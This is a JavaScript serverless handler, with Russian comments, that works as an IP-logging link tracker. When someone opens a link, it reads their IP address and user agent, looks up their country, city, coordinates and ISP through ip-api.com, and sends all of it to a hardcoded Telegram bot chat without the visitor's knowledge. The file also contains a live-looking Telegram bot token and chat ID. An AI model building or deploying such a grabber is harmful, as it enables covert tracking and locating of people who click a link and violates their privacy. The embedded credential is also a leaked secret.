export default async function handler(req, res) {
  // Получаем IP-адрес из заголовков
  const ip = req.headers["x-forwarded-for"]?.split(',')[0] || req.socket.remoteAddress;
  
  // Если IP адрес в формате IPv6, убираем лишнюю часть
  const realIP = ip.startsWith('::ffff:') ? ip.slice(7) : ip;

  // Получаем user-agent и slug (например, ссылку)
  const ua = req.headers["user-agent"] || "N/A";
  const slug = req.query.slug || "неизвестно";

  let geo = {};
  try {
    // Запрашиваем геоданные по IP через публичное API ip-api.com
    const geoRes = await fetch(`http://ip-api.com/json/${realIP}`);
    const geoData = await geoRes.json();

    // Если API вернул ошибку, то установим значения по умолчанию
    if (geoData.status !== 'fail') {
      geo = geoData;
    } else {
      geo = {
        country: "Не удалось получить данные",
        city: "Не удалось получить данные",
        lat: "Не удалось получить данные",
        lon: "Не удалось получить данные",
        org: "Не удалось получить данные"
      };
    }
  } catch (_) {
    geo = {
      country: "Не удалось получить данные",
      city: "Не удалось получить данные",
      lat: "Не удалось получить данные",
      lon: "Не удалось получить данные",
      org: "Не удалось получить данные"
    };
  }

  // Формируем сообщение для отправки в Telegram
  const message = `
🔗 Ссылка: ${slug}
🌍 IP: \`${realIP}\`
📍 Страна: \`${geo.country || "?"}\`
🏙️ Город: \`${geo.city || "?"}\`
🧭 Координаты: \`${geo.lat || "?"}\`, \`${geo.lon || "?"}\`
🌐 ПровайЙдер: \`${geo.org || "?"}\`
🕰️ Локальное время: \`${new Date().toLocaleString()}\`
💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
🧾 UA: \`${ua}\`
  `.trim();

  const token = "7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY";
  const chatId = "2079893058";

  // Отправляем сообщение в Telegram
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
  });

  // Отправляем ответ
  res.status(200).json({ ok: true });
}
